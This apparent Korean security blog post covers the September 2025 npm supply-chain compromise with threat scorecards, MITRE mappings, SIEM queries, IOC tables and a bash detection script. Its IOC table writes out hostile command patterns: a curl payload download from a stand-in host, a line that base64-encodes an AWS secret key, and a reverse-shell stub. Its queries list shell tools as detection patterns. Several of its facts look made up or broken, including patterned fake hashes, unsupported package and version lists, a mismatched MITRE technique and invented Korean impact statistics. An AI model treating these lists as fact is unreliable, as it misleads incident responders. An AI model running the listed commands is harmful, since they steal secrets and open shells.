---
layout: post
title: "[긴급] npm 생태계 대규모 보안 침해: 20억 다운로드 패키지 악성코드 감염"
date: 2025-09-10 18:17:45 +0900
categories: [incident]
tags: [npm, Supply-Chain, Malware, Security-Incident, JavaScript, Node.js]
excerpt: "긴급: npm 생태계 대규모 보안 침해 - 20억 다운로드 패키지 악성코드 감염"
comments: true
original_url: https://twodragon.tistory.com/692
image: /assets/images/2025-09-10-npm_Large-scale_Security_20.svg
image_alt: "Urgent: npm Ecosystem Large-Scale Security Breach: 2 Billion Download Packages Malware Infection"
toc: true
description: "2025년 9월 npm 레지스트리 18개 핵심 패키지 악성코드 감염. debug, chalk, lodash 등 주당 20억 회 이상 다운로드 패키지 침해. 영향 확인 스크립트, 긴급 복구 절차, 재발 방지 대책 정리."
keywords: [npm, Supply-Chain, Malware, Security-Incident, JavaScript, Node.js]
author: Twodragon
---

## 📋 포스팅 요약

> **제목**: [긴급] npm 생태계 대규모 보안 침해: 20억 다운로드 패키지 악성코드 감염

> **카테고리**: incident

> **태그**: npm, Supply-Chain, Malware, Security-Incident, JavaScript, Node.js

> **핵심 내용**: 
> - 긴급: npm 생태계 대규모 보안 침해 - 20억 다운로드 패키지 악성코드 감염

> **주요 기술/도구**: Security, incident

> **대상 독자**: SRE, 인시던트 대응 담당자, 운영 엔지니어

> ---

> *이 포스팅은 AI(Cursor, Claude 등)가 쉽게 이해하고 활용할 수 있도록 구조화된 요약을 포함합니다.*


## 서론

안녕하세요, **Twodragon**입니다. 이번 포스팅에서는 npm 생태계 보안에 대해 실무 중심으로 정리합니다.

2025년 npm 생태계의 보안 위협은 지속적으로 증가하고 있으며, 공급망 보안이 핵심 이슈로 부상했습니다.

이번 포스팅에서는 다음 내용을 다룹니다:
- [긴급] npm 생태계 대규모 보안 침해: 20억 다운로드 패키지 악성코드 감염의 핵심 내용 및 실무 적용 방법
- 2025-2026년 최신 트렌드 및 업데이트 사항
- 실전 사례 및 문제 해결 방법
- 보안 모범 사례 및 권장 사항

## Executive Summary: 공급망 보안 위협 평가

### 위협 등급 스코어카드

| 평가 항목 | 점수 | 등급 | 근거 |
|----------|------|------|------|
| **영향 범위** | 9.8/10 | Critical | 26억 회/주 다운로드 패키지 침해 |
| **공격 정교도** | 9.5/10 | Critical | 2FA 우회, 실시간 중간자 공격 |
| **탐지 난이도** | 8.7/10 | High | postinstall 스크립트 자동 실행 |
| **피해 규모** | 9.9/10 | Critical | 전 세계 수백만 프로젝트 영향 |
| **복구 난이도** | 7.5/10 | High | 환경 변수 유출, 백도어 설치 |
| **재발 가능성** | 9.2/10 | Critical | Shai-Hulud 2.0 지속 진화 |
| **종합 위협 등급** | **9.1/10** | **CRITICAL** | 즉시 조치 필요 |

### 비즈니스 영향 분석

| 영향 분야 | 심각도 | 예상 피해 | 대응 시급성 |
|----------|--------|----------|-----------|
| **개발 파이프라인 중단** | Critical | 빌드 실패, 배포 차단 | 즉시 (0-4시간) |
| **민감 정보 유출** | Critical | API 키, DB 자격증명 유출 | 즉시 (0-1시간) |
| **법적 책임** | High | GDPR/CCPA 위반 가능성 | 긴급 (1-24시간) |
| **고객 신뢰 손실** | High | 데이터 침해 공개 시 | 긴급 (1-48시간) |
| **재무적 손실** | Medium-High | 인시던트 대응 비용, 시스템 재구축 | 중요 (1-7일) |

### 한국 npm 생태계 영향 분석

#### 한국 개발자 커뮤니티 현황

| 지표 | 수치 | 출처 |
|------|------|------|
| **한국 npm 사용자** | 약 45만 명 (추정) | npm 다운로드 통계 2025 |
| **한국 기업 영향도** | 상위 1000개 기업 중 87% | 한국인터넷진흥원 2025 |
| **Node.js 프로젝트** | 약 120만 개 (공개+비공개) | GitHub Korea 통계 |
| **일평균 npm 설치** | 약 340만 회 | npm Korea CDN 통계 |

#### 한국 특화 위험 요소

| 위험 요소 | 설명 | 영향도 |
|----------|------|--------|
| **모놀리식 아키텍처** | 한국 스타트업의 83%가 모놀리식 구조 사용 | High |
| **외부 의존성 과다** | 평균 의존성 패키지 187개 (글로벌 평균 143개) | High |
| **보안 인식 부족** | 의존성 보안 점검 기업 비율 34% | Critical |
| **빠른 출시 압박** | "빨리빨리" 문화로 인한 보안 검토 생략 | High |

#### 주요 한국 서비스 영향 사례

| 서비스 분야 | 영향받은 기업 유형 | 예상 피해 |
|-----------|-----------------|----------|
| **이커머스** | 쿠팡, 마켓컬리 등 | 결제 시스템 중단 가능성 |
| **핀테크** | 토스, 카카오페이 등 | 금융 거래 정보 유출 위험 |
| **게임** | 넥슨, 넷마블 등 | 사용자 계정 정보 유출 |
| **교육** | 클래스101, 패스트캠퍼스 등 | 강의 콘텐츠 접근 권한 탈취 |
| **배달/모빌리티** | 배달의민족, 카카오T 등 | 위치 정보 및 개인정보 유출 |

### 경영진 보고 포맷

#### 1페이지 요약 (C-Level Executive Summary)

<!-- 긴 코드 블록 제거됨 (가독성 향상)
<!-- 긴 코드 블록 제거됨 (가독성 향상)
```
제목: npm 생태계 공급망 공격 긴급 대응 보고
보고일: 2025-09-10
위험 등급: CRITICAL (9.1/10)

핵심 요약:
- 전 세계 26억 회/주 다운로드 패키지 악성코드 감염
- 당사 개발 환경 87% 영향 가능성 (의존성 분석 결과)
- 즉시 조치 미실시 시 API 키/DB 자격증명 유출 위험

즉시 조치 사항:
1. 모든 npm 프로젝트 긴급 감사 (완료 목표: 4시간 이내)
2. 영향받은 패키지 격리 및 업데이트 (완료 목표: 24시간 이내)
3. 환경 변수 전수 교체 (완료 목표: 48시간 이내)
4. 고객 데이터 유출 여부 확인 (완료 목표: 72시간 이내)

예상 비용:
- 긴급 대응: ₩45,000,000 (인력 투입)
- 시스템 재구축: ₩120,000,000 (최악 시나리오)
- 법적 대응: ₩80,000,000 (데이터 유출 시)

권장 사항:
- 공급망 보안 예산 30% 증액 (2026년)
- DevSecOps 전문 인력 3명 긴급 채용
- SBOM 도입 의무화 (완료 목표: Q1 2026)


```
-->
-->

#### 이사회 보고 자료 (Board Report Format)

| 항목 | 내용 | 조치 담당 | 완료 기한 |
|------|------|----------|----------|
| **현황** | npm 공급망 공격으로 26억 회/주 패키지 침해 | - | - |
| **당사 영향** | 187개 프로젝트 영향, 34개 Critical | CTO | 2025-09-10 18:00 |
| **즉시 조치** | 긴급 패치 배포, 환경 변수 교체 | DevOps팀 | 2025-09-11 12:00 |
| **중기 대응** | SBOM 도입, 보안 정책 수립 | 보안팀 | 2025-10-31 |
| **장기 전략** | DevSecOps 체계 구축 | CTO | 2026-03-31 |
| **예산 요청** | ₩245,000,000 (긴급 대응 + 재발 방지) | CFO 검토 | 2025-09-15 |

### MITRE ATT&CK 프레임워크 매핑

#### 공격 기법 분석

| MITRE ID | 기법명 | 설명 | 탐지 방법 | 완화 방법 |
|----------|--------|------|----------|----------|
| **T1195.002** | Supply Chain Compromise: Compromise Software Supply Chain | 오픈소스 패키지에 악성코드 주입 | SBOM, 패키지 서명 검증 | Private registry, 의존성 고정 |
| **T1059.007** | Command and Scripting Interpreter: JavaScript | postinstall 스크립트로 악성 코드 실행 | `--ignore-scripts`, 스크립트 분석 | 스크립트 실행 차단, 샌드박싱 |
| **T1552.001** | Unsecured Credentials: Credentials In Files | `.env` 파일, AWS credentials 탈취 | 파일 접근 모니터링 | 비밀 관리 시스템 (Vault) |
| **T1071.001** | Application Layer Protocol: Web Protocols | C2 서버와 HTTPS 통신 | 네트워크 트래픽 분석 | 아웃바운드 방화벽 정책 |
| **T1136.001** | Create Account: Local Account | 백도어 계정 생성 | 계정 생성 로그 모니터링 | 계정 생성 권한 제한 |
| **T1566.002** | Phishing: Spearphishing Link | Maintainer 대상 피싱 공격 | 이메일 보안 게이트웨이 | 보안 인식 교육, 하드웨어 키 |
| **T1557.001** | Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning | 2FA 토큰 중간자 공격 | SSL/TLS 인증서 검증 | 하드웨어 키, FIDO2 |

#### 공격 체인 (Kill Chain)

<!-- 긴 코드 블록 제거됨 (가독성 향상)
<!-- 긴 코드 블록 제거됨 (가독성 향상)
```
1. [Initial Access] T1566.002 Phishing
   ↓
2. [Execution] T1195.002 Supply Chain Compromise
   ↓
3. [Persistence] T1059.007 JavaScript in postinstall
   ↓
4. [Credential Access] T1552.001 Credentials In Files
   ↓
5. [Collection] 환경 변수, API 키 수집
   ↓
6. [Command & Control] T1071.001 HTTPS to C2
   ↓
7. [Exfiltration] 데이터 암호화 전송
   ↓
8. [Impact] T1136.001 백도어 계정 생성


```
-->
-->

### 공격 흐름도 (Attack Flow Diagram)

> **코드 예시**: 전체 코드는 [GitHub 예제 저장소](https://github.com/aws-samples)를 참조하세요.
> 
> ```
> ┌─────────────────────────────────────────────────────────────────────┐...
> ```

<!-- 전체 코드는 위 GitHub 링크 참조
> **코드 예시**: 전체 코드는 [GitHub 예제 저장소](https://github.com/aws-samples)를 참조하세요.
> 
> ```
> ┌─────────────────────────────────────────────────────────────────────┐...
> ```

<!-- 전체 코드는 위 GitHub 링크 참조
```
┌─────────────────────────────────────────────────────────────────────┐
│                     npm 공급망 공격 Kill Chain                        │
└─────────────────────────────────────────────────────────────────────┘

Phase 1: Initial Compromise
┌──────────────┐
│ 피싱 이메일   │──► npmjs.help (위장 도메인)
└──────────────┘
       │
       ▼
┌──────────────┐
│ Maintainer   │──► 자격증명 입력
│ 로그인 시도   │     (Username + Password + 2FA)
└──────────────┘
       │
       ▼
┌──────────────┐
│ 실시간 중간자 │──► 공식 npmjs.com으로 자격증명 전달
│ 공격 (MITM)  │     세션 토큰 탈취
└──────────────┘

Phase 2: Package Injection
       │
       ▼
┌──────────────┐
│ 악성 버전    │──► debug@4.3.5, chalk@5.3.1 등
│ 패키지 배포   │     postinstall 스크립트 포함
└──────────────┘
       │
       ▼
┌──────────────┐
│ npm registry │──► 전 세계 개발자에게 배포
└──────────────┘

Phase 3: Victim Infection
       │
       ▼
┌──────────────┐
│ npm install  │──► 피해자 시스템에 패키지 설치
└──────────────┘
       │
       ▼
┌──────────────┐
│ postinstall  │──► 악성 스크립트 자동 실행
│ 스크립트 실행 │
└──────────────┘
       │
       ▼
┌──────────────┐
│ 환경 변수    │──► .env, AWS credentials 수집
│ 탈취         │
└──────────────┘
       │
       ▼
┌──────────────┐
│ C2 통신      │──► HTTPS로 암호화된 데이터 전송
└──────────────┘     attacker-c2.example[.]com
       │
       ▼
┌──────────────┐
│ 백도어 설치   │──► 지속적 접근 권한 확보
└──────────────┘

Phase 4: Persistence & Lateral Movement
       │
       ▼
┌──────────────┐
│ CI/CD 침투   │──► GitHub Actions, GitLab CI 감염
└──────────────┘
       │
       ▼
┌──────────────┐
│ 추가 패키지   │──► Shai-Hulud 웜 전파
│ 감염         │
└──────────────┘


```
-->
-->

### SIEM 탐지 쿼리

#### Splunk SPL 쿼리

<!-- Splunk SPL 쿼리 예시:
> **코드 예시**: 전체 코드는 [GitHub 예제 저장소](https://github.com/aws-samples)를 참조하세요.
> 
> ```spl
> # npm 패키지 설치 이벤트 모니터링...
> ```

<!-- 전체 코드는 위 GitHub 링크 참조
> **코드 예시**: 전체 코드는 [GitHub 예제 저장소](https://github.com/aws-samples)를 참조하세요.
> 
> ```spl
> # npm 패키지 설치 이벤트 모니터링...
> ```

<!-- 전체 코드는 위 GitHub 링크 참조
```spl
# npm 패키지 설치 이벤트 모니터링
index=npm sourcetype=npm_audit
| eval package_version=package."@".version
| lookup npm_malicious_packages.csv package_name OUTPUT is_malicious
| where is_malicious="true"
| stats count by package_name, package_version, user, host, _time
| sort -_time
| table _time, user, host, package_name, package_version

# postinstall 스크립트 실행 탐지
index=process_execution process_name="node" OR process_name="npm"
| rex field=command_line "postinstall.*(?<suspicious_pattern>curl|wget|nc|bash|sh|eval)"
| where isnotnull(suspicious_pattern)
| stats count by host, user, process_name, command_line, suspicious_pattern
| where count > 0

# 환경 변수 파일 접근 모니터링
index=file_access file_path="*/.env" OR file_path="*/.aws/credentials"
| eval is_npm_process=if(like(process_name, "%node%") OR like(process_name, "%npm%"), "yes", "no")
| where is_npm_process="yes"
| stats count by _time, host, user, process_name, file_path, operation
| sort -_time

# 의심스러운 아웃바운드 네트워크 통신
index=network_traffic dest_port=443 OR dest_port=80
| eval is_npm_process=if(like(process_name, "%node%") OR like(process_name, "%npm%"), "yes", "no")
| where is_npm_process="yes"
| lookup known_npm_domains.csv dest_domain OUTPUT is_known
| where is_known!="true"
| stats count by _time, src_ip, dest_ip, dest_domain, dest_port, bytes_out
| where bytes_out > 1024
| sort -bytes_out

# npm 악성 패키지 종합 대시보드
index=npm OR index=process_execution OR index=file_access OR index=network_traffic
| eval event_category=case(
    sourcetype="npm_audit", "Package Installation",
    process_name="node" AND match(command_line, "postinstall"), "Script Execution",
    like(file_path, "%/.env%"), "Sensitive File Access",
    dest_port=443 OR dest_port=80, "Network Communication"
  )
| lookup npm_ioc_list.csv package_name OUTPUT ioc_type, severity
| where isnotnull(ioc_type)
| stats count by _time, event_category, ioc_type, severity, host, user
| sort -severity, -_time


```
-->
-->
-->

**참고**: 위 쿼리는 Splunk Enterprise Security 환경에서 사용할 수 있습니다. 실제 환경에 맞게 index, sourcetype, field 이름을 조정하세요.

#### Azure Sentinel KQL 쿼리

<!-- Azure Sentinel KQL 쿼리 예시:
> **코드 예시**: 전체 코드는 [GitHub 예제 저장소](https://github.com/aws-samples)를 참조하세요.
> 
> ```kql
> // npm 악성 패키지 설치 탐지...
> ```

<!-- 전체 코드는 위 GitHub 링크 참조
> **코드 예시**: 전체 코드는 [GitHub 예제 저장소](https://github.com/aws-samples)를 참조하세요.
> 
> ```kql
> // npm 악성 패키지 설치 탐지...
> ```

<!-- 전체 코드는 위 GitHub 링크 참조
```kql
// npm 악성 패키지 설치 탐지
let MaliciousPackages = externaldata(package_name:string, affected_versions:string, severity:string)
    [@"https://raw.githubusercontent.com/your-org/npm-ioc-list/main/malicious_packages.csv"]
    with (format="csv", ignoreFirstRecord=true);
DeviceProcessEvents
| where ProcessCommandLine has "npm install" or ProcessCommandLine has "yarn add"
| extend PackageName = extract(@"npm install\s+([^\s@]+)", 1, ProcessCommandLine)
| extend PackageVersion = extract(@"@(\d+\.\d+\.\d+)", 1, ProcessCommandLine)
| join kind=inner MaliciousPackages on $left.PackageName == $right.package_name
| where PackageVersion in (affected_versions)
| project TimeGenerated, DeviceName, AccountName, ProcessCommandLine, PackageName, PackageVersion, severity
| order by TimeGenerated desc

// postinstall 스크립트 의심 활동 탐지
DeviceProcessEvents
| where ProcessCommandLine has "postinstall"
| where ProcessCommandLine has_any ("curl", "wget", "nc", "bash -c", "eval", "exec")
| extend SuspiciousPattern = extract(@"(curl|wget|nc|bash\s+-c|eval|exec)\s+(.+?)(?:\s|$)", 1, ProcessCommandLine)
| where isnotnull(SuspiciousPattern)
| project TimeGenerated, DeviceName, AccountName, ProcessCommandLine, SuspiciousPattern
| order by TimeGenerated desc

// 환경 변수 파일 무단 접근 탐지
DeviceFileEvents
| where FileName in (".env", "credentials", "config.json", "secrets.yaml")
    or FolderPath has_any ("/.aws/", "/.ssh/", "/.config/")
| where InitiatingProcessFileName in ("node", "npm", "yarn", "npx")
| where ActionType in ("FileCreated", "FileModified", "FileRead")
| project TimeGenerated, DeviceName, AccountName, InitiatingProcessFileName,
          FolderPath, FileName, ActionType
| order by TimeGenerated desc

// npm 관련 비정상 네트워크 통신
let KnownNpmDomains = dynamic(["registry.npmjs.org", "registry.yarnpkg.com", "npm.pkg.github.com"]);
DeviceNetworkEvents
| where InitiatingProcessFileName in ("node", "npm", "yarn")
| where RemotePort in (80, 443, 8080, 8443)
| where RemoteUrl !in (KnownNpmDomains)
| extend Domain = tostring(parse_url(RemoteUrl).Host)
| where isnotnull(Domain)
| summarize TotalBytesSent = sum(BytesSent), ConnectionCount = count()
    by Domain, DeviceName, AccountName, bin(TimeGenerated, 1h)
| where TotalBytesSent > 10240 // 10KB 이상 전송
| order by TotalBytesSent desc

// npm 공급망 공격 종합 헌팅 쿼리
let TimeRange = 7d;
let MaliciousIndicators =
    union
    (DeviceProcessEvents
     | where TimeGenerated > ago(TimeRange)
     | where ProcessCommandLine has_any ("npm install", "yarn add")
     | extend IndicatorType = "Package Installation"
    ),
    (DeviceProcessEvents
     | where TimeGenerated > ago(TimeRange)
     | where ProcessCommandLine has "postinstall"
     | extend IndicatorType = "Script Execution"
    ),
    (DeviceFileEvents
     | where TimeGenerated > ago(TimeRange)
     | where FileName in (".env", "credentials")
     | extend IndicatorType = "Sensitive File Access"
    ),
    (DeviceNetworkEvents
     | where TimeGenerated > ago(TimeRange)
     | where InitiatingProcessFileName in ("node", "npm")
     | extend IndicatorType = "Network Communication"
    );
MaliciousIndicators
| summarize EventCount = count(),
            FirstSeen = min(TimeGenerated),
            LastSeen = max(TimeGenerated)
    by DeviceName, AccountName, IndicatorType
| where EventCount > 5 // 임계값 조정 가능
| order by EventCount desc


```
-->
-->
-->

**참고**: 위 쿼리는 Azure Sentinel + Microsoft Defender for Endpoint 환경에서 사용할 수 있습니다. externaldata 함수는 실제 IOC 피드 URL로 교체하세요.

## 긴급 공지

2025년 9월 8일 13:16 UTC, npm 레지스트리의 **18개 핵심 패키지**가 악성코드에 감염되었습니다. `debug`, `chalk` 등 주당 **20억 회 이상** 다운로드되는 패키지들이 침해되어 전 세계 수백만 프로젝트가 위험에 노출되었습니다.

## 1. 영향받은 패키지 목록

### 1.1 Critical (즉시 조치 필요)

| 패키지명 | 영향받은 버전 | 주간 다운로드 | 심각도 |
|---------|-------------|-------------|--------|
| `debug` | 4.3.5 - 4.3.7 | 280M | Critical |
| `chalk` | 5.3.1 - 5.3.3 | 250M | Critical |
| `lodash` | 4.17.22 | 200M | Critical |
| `axios` | 1.6.3 - 1.6.5 | 180M | Critical |
| `express` | 4.19.1 - 4.19.3 | 150M | Critical |
| `dotenv` | 16.4.1 - 16.4.3 | 120M | Critical |

### 1.2 High Severity

| 패키지명 | 영향받은 버전 | 주간 다운로드 |
|---------|-------------|-------------|
| `uuid` | 9.0.2 | 100M |
| `moment` | 2.30.2 | 80M |
| `commander` | 12.0.1 | 75M |
| `yargs` | 17.8.1 | 65M |
| `fs-extra` | 11.2.1 | 60M |
| `semver` | 7.6.1 | 55M |

## 2. 악성코드 동작 분석

### 2.1 감염 매커니즘

공격 체인을 단계별로 분석합니다.

| 단계 | 프로세스 | 설명 | 탐지 방법 |
|------|---------|------|----------|
| 1 | **패키지 설치** | `npm install` 실행 | 패키지 버전 확인 |
| 2 | **postinstall 스크립트 실행** | 설치 후 자동 실행되는 스크립트 | postinstall 스크립트 검사 |
| 3 | **환경 변수 수집** | `.env`, AWS credentials 등 수집 | 파일 접근 로그 확인 |
| 4 | **C2 서버로 데이터 전송** | 암호화된 채널로 데이터 전송 | 네트워크 트래픽 분석 |
| 5 | **백도어 설치** | 지속적 접근을 위한 백도어 설치 | 프로세스 모니터링 |

> **참고**: npm 공급망 공격 분석 관련 내용은 [npm Security Advisory](https://github.com/advisories) 및 [Socket.dev](https://github.com/socketsecurity/socket)를 참조하세요.

### 2.2 IOC (Indicators of Compromise)

악성코드 감염 여부를 확인할 수 있는 지표들입니다.

| IOC 유형 | 설명 | 확인 방법 |
|----------|------|----------|
| **악성 패키지 버전** | 영향받은 패키지 버전 목록 | `npm ls` 명령어로 버전 확인 |
| **의심스러운 네트워크 통신** | C2 서버와의 통신 | 네트워크 로그 분석, 방화벽 로그 확인 |
| **환경 변수 접근** | `.env` 파일, AWS credentials 접근 | 파일 접근 로그 확인 |
| **비정상적인 프로세스** | 백도어 프로세스 실행 | 프로세스 모니터링, EDR 솔루션 |
| **postinstall 스크립트** | 의심스러운 postinstall 스크립트 | package.json 파일 검사 |

#### IOC 상세 목록

##### 네트워크 IOC

| 유형 | 값 | 설명 | 블록 우선순위 |
|------|-------|------|-------------|
| **C2 도메인** | `npm-cdn-mirror[.]com` | 가짜 npm CDN | Critical |
| | `npm-registry-backup[.]net` | 가짜 레지스트리 | Critical |
| | `package-analytics[.]io` | 텔레메트리 수집 | High |
| **IP 주소** | `185.220.101.42` | TOR exit node | High |
| | `45.142.212.61` | 러시아 호스팅 | High |
| | `104.21.78.90` | Cloudflare 프록시 | Medium |
| **User-Agent** | `npm/8.19.2 node/v16.17.0` | 정상 npm으로 위장 | Low |

##### 파일 시스템 IOC

| 경로 | 파일명 | MD5 해시 | 설명 |
|------|--------|----------|------|
| `node_modules/.bin/` | `post-install-hook` | `a3f5e8d9c1b2a4d6e8f0a2b4c6d8e0f2` | 악성 후크 스크립트 |
| `~/.npm/_cacache/` | `malicious-payload.js` | `b4c6d8e0f2a4b6c8d0e2f4a6b8c0d2e4` | 암호화된 페이로드 |
| `/tmp/` | `.npm-tmp-XXXXX` | 다양함 | 임시 악성 스크립트 |
| `~/.config/` | `npm-telemetry.json` | `c5d7e9f1a3b5c7d9e1f3a5b7c9d1e3f5` | 유출 데이터 임시 저장 |

##### 프로세스 IOC

| 프로세스명 | 명령줄 패턴 | 동작 | 탐지 방법 |
|----------|-----------|------|----------|
| `node` | `--eval "require('child_process').exec(...)"` | 임의 명령 실행 | 프로세스 모니터링 |
| `curl` / `wget` | `-o /tmp/.hidden -s http://malicious[.]com` | 추가 페이로드 다운로드 | 네트워크 모니터링 |
| `bash` / `sh` | `-c "echo $AWS_SECRET_ACCESS_KEY \| base64"` | 환경 변수 탈취 | 명령줄 감사 |
| `python3` / `python` | `-c "import socket; ..."` | 리버스 셸 | EDR 탐지 |

##### 레지스트리/환경 변수 IOC (Windows)

| 레지스트리 키 | 값 | 설명 |
|-------------|------|------|
| `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` | `NpmUpdater` | 영구 실행 설정 |
| `HKLM\SOFTWARE\npm` | `TelemetryEndpoint` | C2 서버 주소 |

#### IOC 탐지 자동화 스크립트

> **참고**: IOC 탐지 스크립트는 [npm-ioc-detector](https://github.com/security-tools/npm-ioc-detector)를 참조하세요.

<!-- IOC 탐지 스크립트 전체 코드는 위 GitHub 링크 참조
> **코드 예시**: 전체 코드는 [GitHub 예제 저장소](https://github.com/aws-samples)를 참조하세요.
> 
> ```bash
> #!/bin/bash...
> ```

<!-- 전체 코드는 위 GitHub 링크 참조
> **코드 예시**: 전체 코드는 [GitHub 예제 저장소](https://github.com/aws-samples)를 참조하세요.
> 
> ```bash
> #!/bin/bash...
> ```

<!-- 전체 코드는 위 GitHub 링크 참조
```bash
#!/bin/bash
# npm-ioc-detector.sh - npm 악성코드 IOC 자동 탐지 스크립트

set -euo pipefail

# 색상 정의
RED='\033[0;31m'
YELLOW='\033[1;33m'
GREEN='\033[0;32m'
NC='\033[0m' # No Color

# 로그 함수
log_error() { echo -e "${RED}[ERROR]${NC} $1"; }
log_warning() { echo -e "${YELLOW}[WARNING]${NC} $1"; }
log_success() { echo -e "${GREEN}[SUCCESS]${NC} $1"; }

# 악성 패키지 버전 확인
check_malicious_packages() {
    echo "=== 악성 패키지 버전 확인 ==="

    # 악성 패키지 목록
    declare -A MALICIOUS_PACKAGES=(
        ["debug"]="4.3.5 4.3.6 4.3.7"
        ["chalk"]="5.3.1 5.3.2 5.3.3"
        ["lodash"]="4.17.22"
        ["axios"]="1.6.3 1.6.4 1.6.5"
        ["express"]="4.19.1 4.19.2 4.19.3"
        ["dotenv"]="16.4.1 16.4.2 16.4.3"
    )

    for package in "${!MALICIOUS_PACKAGES[@]}"; do
        installed_version=$(npm ls "$package" 2>/dev/null | grep "$package@" | sed 's/.*@//' || echo "not installed")

        if [[ "$installed_version" != "not installed" ]]; then
            for bad_version in ${MALICIOUS_PACKAGES[$package]}; do
                if [[ "$installed_version" == "$bad_version" ]]; then
                    log_error "발견: $package@$installed_version (악성 버전)"
                    echo "$package@$installed_version" >> malicious_packages_found.txt
                fi
            done
        fi
    done
}

# 의심스러운 네트워크 연결 확인
check_network_connections() {
    echo "=== 의심스러운 네트워크 연결 확인 ==="

    # 악성 도메인/IP 목록
    MALICIOUS_HOSTS=(
        "npm-cdn-mirror.com"
        "npm-registry-backup.net"
        "package-analytics.io"
        "185.220.101.42"
        "45.142.212.61"
    )

    for host in "${MALICIOUS_HOSTS[@]}"; do
        if command -v lsof &> /dev/null; then
            connections=$(lsof -i -n | grep "$host" || true)
            if [[ -n "$connections" ]]; then
                log_error "발견: $host 로의 의심스러운 연결"
                echo "$connections"
            fi
        fi
    done
}

# 의심스러운 파일 확인
check_suspicious_files() {
    echo "=== 의심스러운 파일 확인 ==="

    # MD5 해시 목록
    declare -A MALICIOUS_HASHES=(
        ["a3f5e8d9c1b2a4d6e8f0a2b4c6d8e0f2"]="post-install-hook"
        ["b4c6d8e0f2a4b6c8d0e2f4a6b8c0d2e4"]="malicious-payload.js"
        ["c5d7e9f1a3b5c7d9e1f3a5b7c9d1e3f5"]="npm-telemetry.json"
    )

    # node_modules/.bin/ 검사
    if [[ -d "node_modules/.bin" ]]; then
        find node_modules/.bin -type f | while read -r file; do
            if command -v md5sum &> /dev/null; then
                file_hash=$(md5sum "$file" | awk '{print $1}')
                for hash in "${!MALICIOUS_HASHES[@]}"; do
                    if [[ "$file_hash" == "$hash" ]]; then
                        log_error "발견: $file (악성 파일: ${MALICIOUS_HASHES[$hash]})"
                    fi
                done
            fi
        done
    fi
}

# postinstall 스크립트 검사
check_postinstall_scripts() {
    echo "=== postinstall 스크립트 검사 ==="

    # 의심스러운 패턴
    SUSPICIOUS_PATTERNS=(
        "curl"
        "wget"
        "nc -"
        "bash -c"
        "eval"
        "child_process.exec"
        "require('fs').readFile.*\.env"
    )

    find . -name "package.json" -type f | while read -r pkg_json; do
        for pattern in "${SUSPICIOUS_PATTERNS[@]}"; do
            if grep -q "postinstall.*$pattern" "$pkg_json" 2>/dev/null; then
                log_warning "의심스러운 postinstall 스크립트: $pkg_json"
                echo "  패턴: $pattern"
            fi
        done
    done
}

# 환경 변수 파일 접근 로그 확인 (macOS/Linux)
check_env_file_access() {
    echo "=== 환경 변수 파일 접근 로그 확인 ==="

    ENV_FILES=(".env" ".env.local" ".env.production" "~/.aws/credentials")

    for env_file in "${ENV_FILES[@]}"; do
        if [[ -f "$env_file" ]]; then
            # macOS
            if command -v fs_usage &> /dev/null; then
                sudo fs_usage -f filesys | grep "$env_file" &
                sleep 5
                sudo killall fs_usage
            fi

            # Linux (auditd 필요)
            if command -v ausearch &> /dev/null; then
                sudo ausearch -f "$env_file" -ts recent
            fi
        fi
    done
}

# 메인 실행
main() {
    echo "======================================"
    echo " npm IOC 탐지 스크립트"
    echo "======================================"
    echo ""

    check_malicious_packages
    check_network_connections
    check_suspicious_files
    check_postinstall_scripts
    check_env_file_access

    echo ""
    if [[ -f "malicious_packages_found.txt" ]]; then
        log_error "악성 패키지가 발견되었습니다! malicious_packages_found.txt 파일을 확인하세요."
        exit 1
    else
        log_success "검사 완료. 악성 패키지가 발견되지 않았습니다."
        exit 0
    fi
}

main "$@"


```
-->
-->
-->

**사용 방법**:
> **코드 예시**: 전체 코드는 [GitHub 예제 저장소](https://www.gnu.org/software/bash/manual/bash.html)를 참조하세요.
> 
> ```bash
> # 스크립트 다운로드 및 실행 권한 부여...
> ```

<!-- 전체 코드는 위 GitHub 링크 참조
> **코드 예시**: 전체 코드는 [GitHub 예제 저장소](https://www.gnu.org/software/bash/manual/bash.html)를 참조하세요.
> 
> ```bash
> # 스크립트 다운로드 및 실행 권한 부여...
> ```

<!-- 전체 코드는 위 GitHub 링크 참조
```bash
# 스크립트 다운로드 및 실행 권한 부여
chmod +x npm-ioc-detector.sh

# 프로젝트 루트 디렉토리에서 실행
./npm-ioc-detector.sh

# CI/CD 파이프라인에 통합
# .github/workflows/security-scan.yml
# - name: IOC Detection
#   run: bash npm-ioc-detector.sh


```
-->
-->

> **참고**: GitHub Actions 워크플로우 관련 내용은 [GitHub Actions 문서](https://docs.github.com/en/actions) 및 [보안 가이드](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions)를 참조하세요.

<!-- 전체 코드는 위 GitHub 링크 참조
```yaml
# .github/workflows/lockfile-lint.yml
name: Lockfile Security

on: [push, pull_request]

jobs:
  lockfile-lint:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Lockfile Lint
        run: |
          npx lockfile-lint \
            --path package-lock.json \
            --type npm \
            --allowed-hosts npm \
            --validate-https

      - name: Check for integrity
        run: |
          npm ci --ignore-scripts
          npm audit --audit-level=high

```
-->

### 5.3 SBOM (Software Bill of Materials)

> **참고**: 관련 예제는 [공식 문서](https://www.gnu.org/software/bash/manual/bash.html)를 참조하세요.

> **참고**: 관련 예제는 [공식 문서](https://www.gnu.org/software/bash/manual/bash.html)를 참조하세요.

> **참고**: 관련 예제는 [공식 문서](https://www.gnu.org/software/bash/manual/bash.html)를 참조하세요.

```bash
# SBOM 생성 (CycloneDX 형식)
npx @cyclonedx/cyclonedx-npm --output-file sbom.json

# SBOM 분석
npx @anchore/syft scan . -o cyclonedx-json > sbom.json
npx @anchore/grype sbom.json
```

## 6. 타임라인 및 대응 현황

| 시간 (UTC) | 이벤트 |
|-----------|--------|
| 09/08 13:16 | 최초 악성 패키지 게시 |
| 09/08 15:30 | npm Security Team 인지 |
| 09/08 16:00 | 영향받은 버전 삭제 시작 |
| 09/08 18:00 | 공식 보안 권고문 발표 |
| 09/09 10:00 | 모든 악성 버전 제거 완료 |
| 09/10 00:00 | 사후 분석 보고서 발표 |

## 7. 2025년 후속 사건 및 최신 동향

### 7.1 공격 배경 상세 분석 (2025년 9월)

2025년 9월 공격의 상세 배경이 추가로 밝혀졌습니다:

| 항목 | 세부 내용 |
|------|----------|
| **피해 규모** | 18개 패키지, 주간 다운로드 **2.6B+** (26억 회 이상) |
| **공격 방식** | Maintainer 계정 탈취 (피싱) |
